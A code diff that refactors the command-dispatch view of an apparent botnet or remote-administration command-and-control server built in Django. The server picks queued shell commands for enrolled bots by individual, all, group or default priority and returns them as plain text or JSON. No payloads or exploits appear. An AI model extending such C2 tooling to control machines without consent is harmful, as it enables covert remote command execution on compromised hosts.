@@ -4,10 +4,11 @@ from django.utils import timezone
 from django.shortcuts import get_object_or_404
 from convey.models import Bot, Command, Bot_Command
 from convey.views.utils import get_ip
+import json
 
 # Grab a Command object based on a hash_sum or group number
 # If no command exists for the query, return None
-def get_cmd(bot, query_set, hash_sum=None, group=None):
+def query_cmd(bot, query_set, hash_sum=None, group=None):
     cmd_list = None
     if hash_sum:
         cmd_list = query_set.filter(hash_assigned=hash_sum)
@@ -26,6 +27,33 @@ def get_cmd(bot, query_set, hash_sum=None, group=None):
             return cmd
 
     return None
+
+def get_current_cmd(bot, active_cmds):
+    # Prioritize individual commands, ALL commands, group commands, and lastly
+    # DEFAULT commands
+    command = query_cmd(bot, active_cmds, hash_sum=bot.hash_sum)
+    if command: return command
+
+    command = query_cmd(bot, active_cmds, group=-1)
+    if command: return command
+
+    command = query_cmd(bot, active_cmds, group=bot.group)
+    if command: return command
+
+    command = query_cmd(bot, active_cmds, group=-2)
+    if command: return command
+
+    # If no commands are in the bot's queue, return None
+    return None
+
+def command_to_json(command):
+    cmd_dict = {
+        "shell": command.shell,
+        "command_text": command.cmd_txt,
+    }
+    json_str = json.dumps(cmd_dict)
+
+    return json_str
 
 @csrf_exempt
 def cmd(request):
@@ -53,25 +81,8 @@ def cmd(request):
     if not active_cmds:
         raise Http404
 
-    # Prioritize individual commands, ALL commands, group commands, and lastly
-    # default commands
-    # If no commands are in the bot's queue, return a 404
-
-    command = False
-    while True: # Run within loop to allow for better flow control
-        command = get_cmd(bot, active_cmds, hash_sum=hash_sum)
-        if command:
-            break
-        command = get_cmd(bot, active_cmds, group=-1)
-        if command:
-            break
-        command = get_cmd(bot, active_cmds, group=bot.group)
-        if command:
-            break
-        command = get_cmd(bot, active_cmds, group=-2)
-        break
-
-    # If command selected then continue
+    # If command selected then continue, else return 404
+    command = get_current_cmd(bot, active_cmds);
     if command:
         # Then check if bot already ran command
         # If not, then add command to bot's list of completed commands
@@ -80,6 +91,15 @@ def cmd(request):
             cmd=command,
         )
 
-        # Lastly return the command text (or 404)
-        return HttpResponse(command.cmd_txt)
-    raise Http404
+        # Check if client is a legacy client
+        if version:
+            # Create json with command information
+            command_response = command_to_json(command)
+        else:
+            # Or just return the command text
+            command_response = command.cmd_txt
+
+        # Lastly return the command
+        return HttpResponse(command_response)
+    else:
+        raise Http404
